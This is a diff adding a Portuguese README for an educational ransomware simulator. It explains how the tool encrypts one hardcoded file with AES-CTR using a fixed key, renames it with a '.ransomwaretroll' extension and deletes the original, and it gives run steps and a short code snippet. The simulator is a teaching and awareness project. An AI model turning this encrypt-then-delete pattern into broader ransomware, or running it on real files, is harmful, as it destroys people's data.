@@ -1,0 +1,95 @@
+Ransomware Simulator
+Este projeto é um simulador de ransomware desenvolvido para fins educacionais e de conscientização sobre segurança cibernética. Ele demonstra como um ataque de ransomware pode criptografar arquivos em um sistema.
+
+🚀 Funcionalidades
+Criptografia de Arquivos: Usa o algoritmo AES (Advanced Encryption Standard) no modo CTR para criptografar arquivos.
+
+Remoção Segura do Original: Remove o arquivo original apenas após a criptografia bem-sucedida.
+
+Extensão Personalizada: Adiciona uma extensão personalizada (.ransomwaretroll) ao arquivo criptografado.
+
+📦 Melhorias em Relação ao Código Original
+O código original foi aprimorado para ser mais seguro, legível e eficiente. Aqui estão as principais melhorias:
+
+Uso de Context Managers (with):
+Substituí a abertura e fechamento manual de arquivos pelo uso de with, que garante que os arquivos sejam fechados automaticamente, mesmo em caso de erro.
+
+Organização do código:
+
+Parâmetros como o nome do arquivo, chave de criptografia e extensão foram centralizados no início do código, facilitando a manutenção.
+
+Nomenclatura Consistente:
+
+Variáveis foram renomeadas para melhorar a clareza do código.
+
+Eficiência:
+
+O objeto AES é criado apenas uma vez, fora do bloco de escrita, evitando redundâncias.
+
+Ordem Correta de Operações:
+
+O arquivo original só é removido após a criptografia ser concluída com sucesso, garantindo que nenhum dado seja perdido em caso de falha.
+
+Extensão Padronizada:
+
+A extensão do arquivo criptografado é gerada de forma consistente usando f-strings.
+
+⚙️ Como Funciona
+Leitura do Arquivo:
+
+O arquivo original (teste.txt) é lido em modo binário (rb).
+
+Criptografia:
+
+O conteúdo do arquivo é criptografado usando o algoritmo AES no modo CTR.
+
+Escrita do Arquivo Criptografado:
+
+O arquivo criptografado é salvo com a extensão .ransomwaretroll.
+
+Remoção do Original:
+
+O arquivo original é removido do sistema após a criptografia bem-sucedida.
+
+🚀 Como Executar
+Clone o repositório:
+
+bash
+Copy
+git clone https://github.com/CaioM-git/ransomware-simulator.git
+cd ransomware-simulator
+Instale as dependências:
+
+bash
+Copy
+pip install pyaes
+Execute o script:
+
+bash
+Copy
+python ransomware_simulator.py
+Verifique o arquivo criptografado (teste.txt.ransomwaretroll) no diretório.
+
+📌 Exemplo de Uso
+python
+Copy
+# Constantes configuráveis
+FILE_NAME = "teste.txt"
+ENCRYPTION_KEY = b"testeransomwares"
+FILE_EXTENSION = ".ransomwaretroll"
+
+# Abre e lê o arquivo de forma segura usando context manager
+with open(FILE_NAME, "rb") as original_file:
+    file_data = original_file.read()
+
+# Cria o objeto AES uma única vez
+aes = AESModeOfOperationCTR(ENCRYPTION_KEY)
+crypto_data = aes.encrypt(file_data)
+
+# Escreve o arquivo criptografado com nomenclatura consistente
+encrypted_file_name = f"{FILE_NAME}{FILE_EXTENSION}"
+with open(encrypted_file_name, "wb") as encrypted_file:
+    encrypted_file.write(crypto_data)
+
+# Só remove o original após sucesso na criptografia
+os.remove(FILE_NAME)
